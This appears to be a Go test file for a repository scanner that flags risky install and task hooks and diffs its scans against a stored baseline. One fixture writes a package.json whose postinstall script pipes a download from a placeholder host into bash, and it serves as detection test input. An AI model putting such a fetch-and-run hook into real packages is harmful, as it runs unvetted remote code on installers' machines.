package beforerun

import (
	"bytes"
	"os"
	"path/filepath"
	"testing"
)

func TestBaselineRoundTrip(t *testing.T) {
	summary := Summary{
		Root:         "/repo",
		FilesScanned: 3,
		BytesScanned: 128,
		Findings: []Finding{
			finding("BR003", SeverityLow, ".vscode/tasks.json", 1, "automatic task"),
		},
		Counts:    map[string]int{"low": 1},
		RiskScore: 3,
		RiskLevel: "low",
		Threshold: "high",
	}

	var buffer bytes.Buffer
	if err := WriteBaseline(&buffer, summary); err != nil {
		t.Fatal(err)
	}

	baseline, err := ReadBaseline(&buffer)
	if err != nil {
		t.Fatal(err)
	}
	if baseline.FormatVersion != BaselineFormatVersion {
		t.Fatalf("format version = %d, want %d", baseline.FormatVersion, BaselineFormatVersion)
	}
	if baseline.Summary.RiskScore != summary.RiskScore {
		t.Fatalf("summary risk score = %d, want %d", baseline.Summary.RiskScore, summary.RiskScore)
	}
	if len(baseline.Summary.Findings) != 1 || baseline.Summary.Findings[0].Severity != SeverityLow {
		t.Fatalf("finding severity not restored: %#v", baseline.Summary.Findings)
	}
}

func TestDiffAgainstBaseline(t *testing.T) {
	root := t.TempDir()
	content := `{"scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}}`
	if err := os.WriteFile(filepath.Join(root, "package.json"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}

	baselinePath := filepath.Join(root, "baseline.json")
	initial, err := Scan(root, Options{Threshold: SeverityHigh})
	if err != nil {
		t.Fatal(err)
	}
	file, err := os.Create(baselinePath)
	if err != nil {
		t.Fatal(err)
	}
	if err := WriteBaseline(file, initial); err != nil {
		t.Fatal(err)
	}
	file.Close()

	delta, current, err := DiffAgainstBaseline(root, baselinePath, Options{Threshold: SeverityHigh})
	if err != nil {
		t.Fatal(err)
	}
	if !delta.Clean() {
		t.Fatalf("identical scans produced %#v", delta)
	}
	if current.RiskScore != initial.RiskScore {
		t.Fatalf("current risk score = %d, want %d", current.RiskScore, initial.RiskScore)
	}
}

func TestReadBaselineRejectsUnknownVersion(t *testing.T) {
	input := []byte(`{"format_version":99,"created_at":"2026-08-11T00:00:00Z","summary":{}}`)
	_, err := ReadBaseline(bytes.NewReader(input))
	if err == nil {
		t.Fatal("expected unsupported version error")
	}
}
